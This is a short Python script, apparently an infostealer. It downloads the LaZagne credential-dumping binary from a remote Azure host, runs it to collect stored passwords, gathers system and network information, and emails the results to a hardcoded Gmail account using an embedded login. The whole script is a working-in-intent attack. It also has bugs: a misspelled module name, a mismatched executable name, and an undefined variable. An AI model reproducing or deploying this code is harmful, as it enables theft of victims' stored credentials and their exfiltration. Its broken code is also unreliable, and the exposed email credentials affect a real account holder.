#!/usr/bin/env python

import smtplib
import subprocess
import re
import requests
import os


def download(url):
    get_response = requestes.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


download("http://mogiant.azurewebsites.net/laZagne_x64.exe")


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


download("http://mogiant.azurewebsites.net/laZagne_x64.exe")
result3 = subprocess.check_output("laZagne.exe all", shell=True)

command = "msg * failed to start"

command = "sysinfo"
result1 = subprocess.check_output(command, shell=True)
 
command = "ipconfig"
result2 = subprocess.check_output(command, shell=True)

send_mail("captianlastimosa@gmail.com", "wither14", result1)

send_mail("captianlastimosa@gmail.com", "wither14", result2)

send_mail("captianlastimosa@gmail.com", "wither14", result3)

os.remove(remove)
